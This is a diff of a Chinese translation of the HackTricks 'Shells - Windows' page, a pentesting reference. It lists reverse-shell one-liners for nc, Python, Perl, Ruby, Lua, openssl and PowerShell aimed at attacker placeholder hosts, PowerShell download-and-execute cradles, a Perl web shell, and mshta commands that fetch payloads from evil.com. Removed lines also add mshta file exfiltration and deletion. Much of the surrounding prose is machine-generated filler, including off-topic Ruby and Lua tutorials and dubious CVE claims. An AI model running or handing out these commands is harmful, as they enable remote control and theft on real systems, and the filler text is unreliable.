@@ -1,38 +1,29 @@
-# Windows反弹Shell
+# Shells - Windows
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或者 [**Telegram群组**](https://t.me/peass) 或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
+* 你在一个 **网络安全公司** 工作吗？你想在 HackTricks 中看到你的 **公司广告** 吗？或者你想获得 **PEASS 的最新版本或下载 HackTricks 的 PDF** 吗？请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
+* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注** 我的 **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-**HackenProof是所有加密漏洞赏金的家园。**
+找到最重要的漏洞，以便您可以更快地修复它们。Intruder 跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从 API 到 Web 应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
 
-**即时获得奖励**\
-HackenProof的赏金只有在客户存入奖励预算后才会启动。在漏洞验证后，您将获得奖励。
+{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
-**在web3渗透测试中积累经验**\
-区块链协议和智能合约是新的互联网！在其兴起的时代掌握web3安全。
-
-**成为web3黑客传奇**\
-每次验证的漏洞都会获得声望积分，并占据每周排行榜的榜首。
-
-[**在HackenProof上注册**](https://hackenproof.com/register)开始从您的黑客行为中获利！
-
-{% embed url="https://hackenproof.com/register" %}
+***
 
 ## Lolbas
 
-网页[lolbas-project.github.io](https://lolbas-project.github.io/)类似于Linux的[https://gtfobins.github.io/](https://gtfobins.github.io/)。\
-显然，**Windows中没有SUID文件或sudo权限**，但了解**如何**滥用**某些二进制文件**以执行某些意外操作是很有用的，比如**执行任意代码**。
+页面 [lolbas-project.github.io](https://lolbas-project.github.io/) 是为 Windows 设计的，就像 [https://gtfobins.github.io/](https://gtfobins.github.io/) 是为 Linux 设计的。\
+显然，在 Windows 中**没有 SUID 文件或 sudo 权限**，但了解一些**二进制文件**如何被（滥）用以执行某种意外操作是很有用的。
 
 ## NC
 ```bash
@@ -40,7 +31,7 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
 ## SBD
 
-**sbd** 是一个 Netcat 克隆版本，旨在提供可移植性和强大的加密功能。它可以在类Unix操作系统和Microsoft Win32上运行。sbd 使用 AES-CBC-128 + HMAC-SHA1 加密（由 Christophe Devine 实现），支持程序执行（-e 选项）、选择源端口、延迟连续重连以及其他一些不错的功能。sbd 仅支持 TCP/IP 通信。sbd.exe（Kali Linux 发行版的一部分：/usr/share/windows-resources/sbd/sbd.exe）可以作为 Netcat 的替代品上传到 Windows 系统中。
+**sbd** 是一个 Netcat 克隆版本，旨在提供强大的加密功能并具有可移植性。它可以在类Unix操作系统和Microsoft Win32上运行。sbd支持AES-CBC-128 + HMAC-SHA1加密（由Christophe Devine提供），支持程序执行（-e选项），选择源端口，延迟连续重连以及其他一些不错的功能。sbd仅支持TCP/IP通信。sbd.exe（Kali Linux发行版的一部分：/usr/share/windows-resources/sbd/sbd.exe）可以作为Netcat的替代品上传到Windows系统中。
 
 ## Python
 ```bash
@@ -49,77 +40,70 @@ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('1
 ```
 ## Perl
 
-Perl是一种通用的脚本编程语言，广泛用于网络编程和系统管理。它具有强大的文本处理能力和灵活的语法，使其成为渗透测试和黑客活动中常用的工具之一。
+Perl是一种通用的脚本编程语言，广泛用于网络和系统管理任务。它具有强大的文本处理能力和灵活的语法，使其成为渗透测试中常用的工具之一。
 
 ### Perl反向Shell
 
-Perl反向Shell是一种通过网络连接与目标系统进行交互的工具。它可以在目标系统上执行命令、上传和下载文件，以及执行其他与系统交互相关的操作。
+Perl反向Shell是一种利用Perl编写的恶意脚本，用于建立与目标系统的反向连接。它允许攻击者通过网络与受感染的系统进行交互，并执行各种操作，如文件操作、系统命令执行等。
 
-以下是一个Perl反向Shell的示例代码：
+以下是一个示例Perl反向Shell脚本：
 
 ```perl
 use Socket;
 use FileHandle;
 
-$host = "attacker.com";
-$port = 4444;
+$host = "攻击者IP";
+$port = 攻击者端口;
 
 $proto = getprotobyname('tcp');
-socket(SOCKET, PF_INET, SOCK_STREAM, $proto);
-$sin = sockaddr_in($port, inet_aton($host));
-connect(SOCKET, $sin);
+socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "无法创建套接字: $!";
+connect(SOCKET, sockaddr_in($port, inet_aton($host))) or die "无法连接到主机: $!";
 
 open(STDIN, ">&SOCKET");
 open(STDOUT, ">&SOCKET");
 open(STDERR, ">&SOCKET");
 
 system("/bin/sh -i");
+close(STDIN);
+close(STDOUT);
+close(STDERR);
 ```
 
-要使用Perl反向Shell，只需将`$host`和`$port`变量设置为攻击者的IP地址和监听端口。然后，将代码上传到目标系统并执行。
+请将上述示例脚本中的`攻击者IP`和`攻击者端口`替换为实际的IP地址和端口。
+
+要使用Perl反向Shell，您需要在目标系统上运行该脚本。一旦成功建立反向连接，您将能够远程控制目标系统并执行所需的操作。
 
 ### Perl Web Shell
 
-Perl Web Shell是一种通过Web界面与目标系统进行交互的工具。它通常作为一个Web应用程序部署在Web服务器上，可以通过浏览器访问。
+Perl Web Shell是一种基于Perl编写的Web应用程序，用于在目标Web服务器上执行命令和操作。它通常通过Web应用程序的漏洞或弱密码进行部署。
 
-以下是一个Perl Web Shell的示例代码：
+以下是一个示例Perl Web Shell脚本：
 
 ```perl
 #!/usr/bin/perl
 
 use CGI qw(:standard);
-
 print header;
-print start_html(-title=>'Perl Web Shell', -bgcolor=>'white');
+print start_html("Perl Web Shell");
 
 if (param()) {
-    my $cmd = param('cmd');
+    $cmd = param('cmd');
     print "<pre>";
-    print `$cmd`;
+    system($cmd);
     print "</pre>";
 }
 
-print "<form method='post'>";
+print "<form method='POST'>";
 print "<input type='text' name='cmd'>";
-print "<input type='submit' value='Execute'>";
+print "<input type='submit' value='执行'>";
 print "</form>";
 
 print end_html;
 ```
 
-要使用Perl Web Shell，只需将代码保存为`.pl`文件，并将其部署到Web服务器上。然后，通过浏览器访问该文件，即可在Web界面上执行命令。
+要使用Perl Web Shell，您需要将上述脚本上传到目标Web服务器，并通过浏览器访问该脚本的URL。然后，您可以在Web界面上输入命令并执行它们。
 
-### Perl漏洞利用
-
-Perl在过去的几年中发现了一些安全漏洞，这些漏洞可能被黑客利用。因此，在进行渗透测试或黑客活动时，了解这些漏洞并采取相应的防护措施非常重要。
-
-以下是一些常见的Perl漏洞：
-
-- [CVE-2016-1238](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1238): Perl模块`Archive::Tar`中的目录遍历漏洞。
-- [CVE-2016-1237](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1237): Perl模块`Archive::Tar`中的目录遍历漏洞。
-- [CVE-2016-1236](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1236): Perl模块`Archive::Tar`中的目录遍历漏洞。
-
-要利用这些漏洞，黑客可以编写专门的代码或使用现有的工具。然而，为了保护系统安全，建议及时更新Perl和相关模块，并遵循最佳实践来防止漏洞利用。
+请注意，使用Perl反向Shell和Perl Web Shell进行未经授权的访问或攻击是非法的。这些工具仅用于合法的渗透测试和安全审计目的。
 ```bash
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
@@ -128,106 +112,71 @@ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen(
 
 Ruby是一种动态、面向对象的编程语言，常用于Web开发。它具有简洁的语法和强大的功能，被广泛用于构建各种应用程序。
 
-### 安装Ruby
+### Ruby的特点
 
-要在Windows上安装Ruby，可以按照以下步骤进行操作：
+- 简洁：Ruby的语法简单明了，易于阅读和编写。
+- 动态：Ruby是一种动态语言，可以在运行时修改和扩展代码。
+- 面向对象：Ruby支持面向对象编程，允许开发者使用类、对象和继承等概念。
+- 强大的元编程能力：Ruby具有强大的元编程能力，可以在运行时修改和扩展类和对象的行为。
+- 丰富的标准库：Ruby拥有丰富的标准库，提供了许多常用的功能和工具。
 
-1. 访问[Ruby官方网站](https://www.ruby-lang.org/en/downloads/)，下载适用于Windows的Ruby安装程序。
-2. 运行安装程序，并按照提示完成安装过程。
-3. 在命令提示符或PowerShell中，输入`ruby -v`命令，验证Ruby是否成功安装。
+### Ruby的应用领域
 
-### Ruby Shell
+由于Ruby具有简洁、灵活和强大的特性，它在许多领域得到了广泛应用，包括：
 
-Ruby提供了一个交互式的Shell环境，可以用于执行Ruby代码和调试。要启动Ruby Shell，只需在命令提示符或PowerShell中输入`irb`命令。
+- Web开发：Ruby on Rails是一种基于Ruby的Web开发框架，被广泛用于构建高效、可扩展的Web应用程序。
+- 脚本编程：Ruby可以用于编写各种脚本，包括自动化任务、数据处理和系统管理等。
+- 游戏开发：Ruby可以用于开发各种类型的游戏，包括桌面游戏和移动游戏。
+- 数据分析：Ruby提供了丰富的数据处理和分析库，可以用于处理和分析大量数据。
+- 服务器管理：Ruby可以用于编写服务器管理脚本，简化服务器配置和管理的过程。
 
-### Ruby脚本
+### Ruby的学习资源
 
-除了在Ruby Shell中执行代码，还可以将Ruby代码保存为脚本文件并在命令行中运行。要创建一个Ruby脚本，只需使用任何文本编辑器创建一个以`.rb`为扩展名的文件，并将Ruby代码写入其中。
+学习Ruby的最佳途径是通过阅读官方文档和参考书籍，同时结合实践进行学习。以下是一些学习Ruby的资源：
 
-要在命令行中运行Ruby脚本，可以使用以下命令：
+- [Ruby官方文档](https://www.ruby-lang.org/zh_cn/documentation/)
+- [Ruby编程语言](https://book.douban.com/subject/26374895/)
+- [Ruby on Rails教程](https://railstutorial-china.org/book/)
+- [Ruby编程入门经典](https://book.douban.com/subject/25881125/)
 
-```
-ruby script.rb
-```
-
-### Ruby Gems
-
-Ruby Gems是Ruby的包管理器，用于安装和管理Ruby库。要安装一个Ruby Gem，可以使用以下命令：
-
-```
-gem install gem_name
-```
-
-要列出已安装的Ruby Gems，可以使用以下命令：
-
-```
-gem list
-```
-
-### Ruby文档
-
-Ruby提供了详细的文档，可以帮助您了解Ruby的各种功能和用法。要访问Ruby文档，可以使用以下命令：
-
-```
-ri command_or_class
-```
-
-例如，要查看`Array`类的文档，可以使用以下命令：
-
-```
-ri Array
-```
-
-### 总结
-
-Ruby是一种功能强大且易于学习的编程语言，适用于各种应用程序开发。通过安装Ruby、使用Ruby Shell、编写Ruby脚本、安装Ruby Gems和查阅Ruby文档，您可以开始使用Ruby并掌握其各种特性和功能。
+通过学习和实践，你可以掌握Ruby的基本语法和常用技巧，进而开发出高效、可靠的应用程序。
 ```bash
 #Windows
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## Lua
 
-Lua是一种轻量级的脚本语言，常用于嵌入式系统和游戏开发。它具有简单、高效和可扩展的特点，可以通过C语言进行扩展。Lua脚本可以在Windows系统上运行，并且可以通过多种方式与操作系统进行交互。
+Lua是一种轻量级的、高效的脚本语言，广泛用于嵌入式系统和游戏开发中。它具有简单的语法和强大的扩展性，可以通过C语言进行扩展。Lua脚本可以在Windows操作系统上运行，并且可以通过各种方式进行执行和调试。
 
-### Windows下的Lua Shell
+### Lua脚本执行
 
-在Windows系统上，可以使用Lua的交互式Shell来执行Lua脚本。以下是一些常用的Lua Shell：
+在Windows系统上执行Lua脚本有多种方法：
 
-- **Lua for Windows**：这是一个集成了Lua解释器和编辑器的软件包，可以在Windows上运行Lua脚本。它提供了一个交互式的Lua Shell，可以直接在命令行中输入Lua代码并执行。
+1. **命令行执行**：可以使用命令行工具运行Lua脚本。在命令提示符下，输入`lua`命令，然后加上脚本文件的路径，即可执行脚本。
 
-- **ZeroBrane Studio**：这是一个跨平台的集成开发环境（IDE），支持多种编程语言，包括Lua。它提供了一个交互式的Lua Shell，可以在IDE中直接输入和执行Lua代码。
+2. **交互式执行**：可以使用交互式的Lua解释器执行Lua脚本。在命令提示符下，输入`lua`命令，然后直接输入Lua代码，即可执行。
 
-### 与操作系统交互
+3. **集成开发环境（IDE）**：可以使用集成开发环境（IDE）来执行Lua脚本。一些常用的IDE，如ZeroBrane Studio和Lua Development Tools，提供了方便的编辑、执行和调试Lua脚本的功能。
 
-Lua脚本可以通过调用操作系统的API函数来与操作系统进行交互。以下是一些常用的Lua函数，用于与Windows操作系统进行交互：
+### Lua脚本调试
 
-- **os.execute(command)**：执行操作系统命令。可以使用该函数执行任意的Windows命令，如创建文件、删除文件等。
+在Windows系统上调试Lua脚本有多种方式：
 
-- **os.getenv(variable)**：获取操作系统环境变量的值。可以使用该函数获取Windows系统的环境变量，如PATH、TEMP等。
+1. **print函数调试**：可以在Lua脚本中使用print函数输出调试信息。通过在关键位置插入print语句，可以查看变量的值和程序的执行流程。
 
-- **io.popen(command, mode)**：执行操作系统命令，并返回一个文件对象。可以使用该函数执行命令，并读取命令的输出。
+2. **调试器调试**：可以使用调试器来调试Lua脚本。一些常用的调试器，如ZeroBrane Studio和Lua Development Tools，提供了调试功能，可以设置断点、单步执行、查看变量值等。
 
-### 示例
+3. **日志调试**：可以在Lua脚本中使用日志记录调试信息。通过在关键位置插入日志记录语句，可以将调试信息输出到日志文件中，以便后续分析。
 
-以下是一个使用Lua脚本与Windows操作系统交互的示例：
+### Lua脚本扩展
 
-```lua
--- 执行命令并获取输出
-local file = io.popen("dir")
-local output = file:read("*a")
-file:close()
+Lua脚本可以通过C语言进行扩展，以满足特定需求。可以使用Lua的C API来编写扩展模块，然后将其编译为动态链接库（DLL），供Lua脚本调用。
 
--- 打印输出
-print(output)
+扩展模块可以提供额外的功能和性能优化，例如访问操作系统API、处理二进制数据、实现高性能算法等。
 
--- 获取环境变量的值
-local path = os.getenv("PATH")
-print(path)
-```
+### 总结
 
-在上面的示例中，首先使用`io.popen`函数执行`dir`命令，并将输出保存到`output`变量中。然后使用`print`函数打印输出。接下来使用`os.getenv`函数获取`PATH`环境变量的值，并将其打印出来。
-
-通过使用这些函数，可以在Lua脚本中与Windows操作系统进行交互，执行命令、获取环境变量等操作。
+Lua是一种轻量级的、高效的脚本语言，适用于嵌入式系统和游戏开发。在Windows系统上，可以通过命令行执行、交互式执行或使用集成开发环境来执行Lua脚本。调试Lua脚本可以使用print函数、调试器或日志记录。通过C语言扩展，可以为Lua脚本提供额外的功能和性能优化。
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -249,36 +198,42 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 ```
 ## Powershell
 
-Powershell是一种功能强大的脚本语言和命令行工具，广泛用于Windows系统中。它提供了许多内置的命令和功能，可以用于自动化任务、系统管理和网络攻击。
+Powershell是一种强大的脚本语言和命令行工具，广泛用于Windows系统上的自动化任务和系统管理。它提供了许多功能强大的命令和脚本，可以帮助黑客在渗透测试和攻击中实现各种目标。
 
-### Powershell基础知识
+### Powershell反向Shell
 
-- Powershell的命令以`cmdlet`的形式存在，可以通过`Get-Command`命令查看可用的命令。
-- Powershell支持管道操作符`|`，可以将一个命令的输出作为另一个命令的输入。
-- Powershell使用`-`作为命令参数的前缀，例如`Get-Process -Name explorer`。
-- Powershell支持变量，可以使用`$`符号来声明和引用变量。
-- Powershell支持条件语句（如`if`、`else`）和循环语句（如`foreach`、`while`）。
+Powershell反向Shell是一种常用的攻击技术，用于在目标系统上建立与攻击者控制的远程服务器之间的连接。这种连接允许黑客执行各种操作，如文件上传和下载、命令执行以及系统控制。
 
-### Powershell远程执行
+要创建Powershell反向Shell，黑客需要在目标系统上运行一个恶意的Powershell脚本，该脚本将与攻击者的服务器建立连接。一旦连接建立，黑客就可以通过该连接执行各种命令和操作。
 
-Powershell可以通过远程执行来控制远程Windows系统。以下是一些常用的远程执行方法：
+### Powershell下载器
 
-- 使用`Enter-PSSession`命令建立与远程系统的交互式会话。
-- 使用`Invoke-Command`命令在远程系统上执行命令或脚本。
-- 使用`New-PSSession`命令创建一个持久化的远程会话，并使用`Invoke-Command`命令在该会话中执行命令或脚本。
+Powershell下载器是一种常见的攻击工具，用于在目标系统上下载和执行恶意软件。黑客可以使用Powershell下载器来绕过传统的安全防护措施，如防火墙和杀毒软件。
 
-### Powershell后渗透技巧
+Powershell下载器通常通过恶意的Powershell脚本实现。这些脚本会从远程服务器下载恶意软件，并在目标系统上执行。通过使用Powershell下载器，黑客可以轻松地在目标系统上部署和执行各种恶意软件，如间谍软件、勒索软件和远程访问工具。
 
-Powershell在后渗透测试中非常有用，以下是一些常用的Powershell后渗透技巧：
+### Powershell后门
 
-- 使用`Get-WmiObject`命令获取远程系统的信息。
-- 使用`Get-Process`命令查看远程系统上运行的进程。
-- 使用`Get-Service`命令查看远程系统上的服务。
-- 使用`Get-EventLog`命令查看远程系统上的事件日志。
-- 使用`Get-Content`命令读取远程系统上的文件内容。
-- 使用`Set-Content`命令写入内容到远程系统上的文件。
+Powershell后门是一种隐藏在目标系统上的恶意程序，用于在未被授权的情况下访问和控制系统。Powershell后门通常通过恶意的Powershell脚本或可执行文件实现。
 
-Powershell是一种功能强大且灵活的工具，可以在渗透测试和系统管理中发挥重要作用。熟练掌握Powershell的基础知识和常用技巧，将有助于提高工作效率和攻击能力。
+一旦Powershell后门成功安装在目标系统上，黑客就可以使用它来执行各种操作，如文件操作、命令执行和系统控制。Powershell后门通常具有隐蔽性强、功能强大和难以检测的特点，使黑客能够长期潜伏在目标系统中。
+
+### Powershell攻击框架
+
+Powershell攻击框架是一种集成了多种攻击技术和工具的平台，用于在目标系统上执行各种攻击。这些攻击技术包括反向Shell、下载器、后门等。
+
+Powershell攻击框架通常由多个Powershell脚本组成，每个脚本负责执行特定的攻击任务。黑客可以使用Powershell攻击框架来自动化攻击过程，提高攻击效率和成功率。
+
+### Powershell安全
+
+由于Powershell的强大功能和广泛应用，它也成为了黑客攻击的目标。为了保护系统免受Powershell攻击，以下是一些常见的安全措施：
+
+- 限制Powershell脚本的执行权限，只允许受信任的脚本运行。
+- 定期更新系统和Powershell版本，以修复已知的安全漏洞。
+- 使用安全防护工具，如防火墙和杀毒软件，来检测和阻止恶意的Powershell脚本。
+- 加强对系统的监控和日志记录，及时发现和应对Powershell攻击。
+
+通过采取这些安全措施，可以有效减少系统受到Powershell攻击的风险。
 ```bash
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
@@ -293,406 +248,46 @@ powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 执行网络调用的进程：**svchost.exe**\
 写入磁盘的有效载荷：**WebDAV客户端本地缓存**
 
-**一行命令：**
+**一行简述：**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-**在本文档末尾获取有关不同Powershell Shell的更多信息**
-
 ## Mshta
 
-Mshta是一种可执行文件，用于执行HTML应用程序。它可以用于在Windows系统上执行恶意代码。以下是一些使用Mshta的常见技术：
+Mshta是Windows操作系统中的一个实用程序，它允许用户执行HTML应用程序。它可以用于执行恶意代码，因为它可以绕过一些安全限制并在系统上执行任意命令。
 
-### 1. 使用远程URL执行代码
+### 使用Mshta进行远程代码执行
 
-使用Mshta，可以通过远程URL执行恶意代码。以下是一个示例：
+要使用Mshta进行远程代码执行，可以创建一个.hta文件，其中包含恶意代码。然后，可以使用以下命令执行.hta文件：
 
-```powershell
+```plaintext
+mshta <URL>
+```
+
+其中，`<URL>`是包含恶意代码的.hta文件的URL。
+
+### 示例
+
+以下是一个使用Mshta进行远程代码执行的示例：
+
+```plaintext
 mshta http://evil.com/malicious.hta
 ```
 
-### 2. 使用本地文件执行代码
+在此示例中，恶意.hta文件位于`http://evil.com/malicious.hta`，当执行上述命令时，恶意代码将在受害者系统上执行。
 
-使用Mshta，还可以通过本地文件执行恶意代码。以下是一个示例：
+### 防御措施
 
-```powershell
-mshta C:\path\to\malicious.hta
-```
+要防止Mshta被滥用，可以采取以下措施：
 
-### 3. 使用VBScript执行代码
+- 禁用或限制Mshta的执行权限。
+- 定期更新操作系统和应用程序以修补已知的漏洞。
+- 使用可信任的安全软件来检测和阻止恶意代码的执行。
+- 教育用户有关潜在的网络威胁和安全最佳实践。
 
-使用Mshta，可以执行VBScript代码。以下是一个示例：
+## 更多关于不同Powershell Shell的信息
 
-```powershell
-mshta vbscript:Execute("MsgBox ""Hello, World!""")"
-```
-
-### 4. 使用JavaScript执行代码
-
-使用Mshta，还可以执行JavaScript代码。以下是一个示例：
-
-```powershell
-mshta javascript:alert("Hello, World!")
-```
-
-### 5. 使用ActiveX对象执行代码
-
-使用Mshta，可以使用ActiveX对象执行代码。以下是一个示例：
-
-```powershell
-mshta javascript:var shell=new ActiveXObject("WScript.Shell");shell.Run("calc.exe");
-```
-
-### 6. 使用VBScript和JavaScript混合执行代码
-
-使用Mshta，可以混合使用VBScript和JavaScript执行代码。以下是一个示例：
-
-```powershell
-mshta vbscript:Execute("MsgBox ""Hello, World!""");javascript:alert("Hello, World!")
-```
-
-### 7. 使用VBScript和ActiveX对象混合执行代码
-
-使用Mshta，可以混合使用VBScript和ActiveX对象执行代码。以下是一个示例：
-
-```powershell
-mshta vbscript:Execute("MsgBox ""Hello, World!""");javascript:var shell=new ActiveXObject("WScript.Shell");shell.Run("calc.exe");
-```
-
-### 8. 使用JavaScript和ActiveX对象混合执行代码
-
-使用Mshta，可以混合使用JavaScript和ActiveX对象执行代码。以下是一个示例：
-
-```powershell
-mshta javascript:alert("Hello, World!");vbscript:var shell=new ActiveXObject("WScript.Shell");shell.Run("calc.exe");
-```
-
-### 9. 使用VBScript、JavaScript和ActiveX对象混合执行代码
-
-使用Mshta，可以混合使用VBScript、JavaScript和ActiveX对象执行代码。以下是一个示例：
-
-```powershell
-mshta vbscript:Execute("MsgBox ""Hello, World!""");javascript:alert("Hello, World!");vbscript:var shell=new ActiveXObject("WScript.Shell");shell.Run("calc.exe");
-```
-
-### 10. 使用VBScript和JavaScript执行文件下载
-
-使用Mshta，可以使用VBScript和JavaScript执行文件下载。以下是一个示例：
-
-```powershell
-mshta vbscript:dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
-dim bStrm: Set bStrm = createobject("Adodb.Stream")
-xHttp.Open "GET", "http://evil.com/malware.exe", False
-xHttp.Send
-
-with bStrm
-    .type = 1
-    .open
-    .write xHttp.responseBody
-    .savetofile "C:\path\to\malware.exe", 2
-end with
-```
-
-### 11. 使用VBScript和JavaScript执行文件上传
-
-使用Mshta，可以使用VBScript和JavaScript执行文件上传。以下是一个示例：
-
-```powershell
-mshta vbscript:dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
-dim file: Set file = fso.GetFile("C:\path\to\file.txt")
-dim xhr: Set xhr = CreateObject("MSXML2.XMLHTTP")
-xhr.open "POST", "http://evil.com/upload.php", False
-xhr.setRequestHeader "Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary1234567890"
-xhr.send "------WebKitFormBoundary1234567890" & vbCrLf &_
-          "Content-Disposition: form-data; name=""file""; filename=""" & file.Name & """" & vbCrLf &_
-          "Content-Type: application/octet-stream" & vbCrLf & vbCrLf &_
-          file.OpenAsTextStream(1).ReadAll & vbCrLf &_
-          "------WebKitFormBoundary1234567890--"
-```
-
-### 12. 使用VBScript和JavaScript执行命令执行
-
-使用Mshta，可以使用VBScript和JavaScript执行命令执行。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run("cmd.exe /c calc.exe")
-```
-
-### 13. 使用VBScript和JavaScript执行反弹Shell
-
-使用Mshta，可以使用VBScript和JavaScript执行反弹Shell。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run("cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(""10.10.10.10"",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ""PS "" + (pwd).Path + "" > "";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()")
-```
-
-### 14. 使用VBScript和JavaScript执行文件包含
-
-使用Mshta，可以使用VBScript和JavaScript执行文件包含。以下是一个示例：
-
-```powershell
-mshta vbscript:Execute("Dim fso: Set fso = CreateObject(""Scripting.FileSystemObject""): fso.OpenTextFile(""C:\path\to\file.txt"").ReadAll")
-```
-
-### 15. 使用VBScript和JavaScript执行文件删除
-
-使用Mshta，可以使用VBScript和JavaScript执行文件删除。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("Scripting.FileSystemObject").DeleteFile("C:\path\to\file.txt")
-```
-
-### 16. 使用VBScript和JavaScript执行文件复制
-
-使用Mshta，可以使用VBScript和JavaScript执行文件复制。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("Scripting.FileSystemObject").CopyFile "C:\path\to\file.txt", "C:\path\to\destination\file.txt"
-```
-
-### 17. 使用VBScript和JavaScript执行文件移动
-
-使用Mshta，可以使用VBScript和JavaScript执行文件移动。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("Scripting.FileSystemObject").MoveFile "C:\path\to\file.txt", "C:\path\to\destination\file.txt"
-```
-
-### 18. 使用VBScript和JavaScript执行文件重命名
-
-使用Mshta，可以使用VBScript和JavaScript执行文件重命名。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("Scripting.FileSystemObject").MoveFile "C:\path\to\file.txt", "C:\path\to\file_renamed.txt"
-```
-
-### 19. 使用VBScript和JavaScript执行目录创建
-
